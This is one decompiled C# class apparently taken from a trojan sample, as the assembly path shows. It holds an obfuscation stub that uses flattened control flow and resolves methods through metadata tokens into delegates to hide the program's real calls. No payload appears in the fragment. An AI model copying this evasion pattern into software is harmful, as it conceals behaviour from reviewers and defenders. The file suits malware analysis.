// Decompiled with JetBrains decompiler
// Type: ProjNet.Shared.SchemaConsumer
// Assembly: TYPELIBA, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 97BB50BA-9882-4DFE-999C-7A4E4B448F1C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-080eff3ceefca287dc59d176676559ae1aa3f1faec807805114bae214a11f586.exe

using System;
using System.Reflection;
using System.Runtime.CompilerServices;
using TYPELIBA.Identifiers;

namespace ProjNet.Shared
{
  internal class SchemaConsumer
  {
    internal static Module invocationConsumer;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void UpdateExpression(int typemdt)
    {
      int num1 = 0;
      while (true)
      {
        int num2 = num1;
        Type type;
        FieldInfo[] fields;
        int index;
        FieldInfo fieldInfo;
        while (true)
        {
          switch (num2)
          {
            case 0:
              type = SchemaConsumer.invocationConsumer.ResolveType(33554432 + typemdt);
              num2 = 5;
              continue;
            case 1:
            case 5:
              goto label_1;
            case 2:
            case 4:
              if (index >= fields.Length)
              {
                if (true)
                {
                  num2 = 6;
                  continue;
                }
                goto case 0;
              }
              else
              {
                fieldInfo = fields[index];
                goto case 3;
              }
            case 3:
              MethodInfo method = (MethodInfo) SchemaConsumer.invocationConsumer.ResolveMethod(fieldInfo.MetadataToken + 100663296);
              fieldInfo.SetValue((object) null, (object) (MulticastDelegate) Delegate.CreateDelegate(type, method));
              ++index;
              goto case 2;
            case 6:
              goto label_6;
            default:
              if (SchemaConsumer.WriteExpression())
              {
                num2 = 3;
                continue;
              }
              goto label_11;
          }
        }
label_1:
        fields = type.GetFields();
        index = 0;
        num1 = 4;
      }
label_6:
      return;
label_11:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public SchemaConsumer()
    {
      ManagerParamsID.NewExpression();
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    static SchemaConsumer()
    {
      ManagerParamsID.NewExpression();
      SchemaConsumer.invocationConsumer = typeof (SchemaConsumer).Assembly.ManifestModule;
    }

    internal static bool WriteExpression() => true;

    internal static bool StartExpression() => false;

    internal delegate void ReponseMapSerializer(object o);
  }
}
